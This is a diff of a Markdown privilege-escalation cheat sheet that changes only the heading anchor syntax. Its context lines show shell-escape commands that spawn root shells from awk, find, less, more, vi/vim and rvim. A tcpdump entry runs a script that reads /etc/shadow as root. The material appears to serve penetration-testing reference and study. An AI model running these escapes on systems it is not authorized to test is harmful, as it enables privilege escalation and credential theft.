@@ -61,20 +61,20 @@ You could also just generate a binary using msfvenom if desired, but this will r
 
 The following standard Unix tools have many easy ways to perform arbitrary code execution if you find yourself in a situation enabling you to execute them as a privileged user.
 
-#### awk {#awk}
+#### awk <a id="awk"></a>
 
 ```text
 awk 'BEGIN {system("/bin/bash")}'
 ```
 
-#### find {#find}
+#### find <a id="find"></a>
 
 ```text
 find / -exec bash -i \;
 find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
 ```
 
-#### less {#less}
+#### less <a id="less"></a>
 
 From less you can go into vi, and then into a shell.
 
@@ -84,7 +84,7 @@ v
 :shell
 ```
 
-#### more {#more}
+#### more <a id="more"></a>
 
 You need to run more on a file that is bigger than your screen.
 
@@ -93,7 +93,7 @@ more /home/pelle/myfile
 !/bin/bash
 ```
 
-#### tcpdump {#tcpdump}
+#### tcpdump <a id="tcpdump"></a>
 
 ```text
 echo $'id\ncat /etc/shadow' > /tmp/.test
@@ -101,7 +101,7 @@ chmod +x /tmp/.test
 tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
 ```
 
-#### vi/vim {#vivim}
+#### vi/vim <a id="vivim"></a>
 
 ```text
 :shell
@@ -110,7 +110,7 @@ tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
 :!bash
 ```
 
-#### rvim {#rvim}
+#### rvim <a id="rvim"></a>
 
 ```text
 :diffpatch $(sh <&2 >&2) 
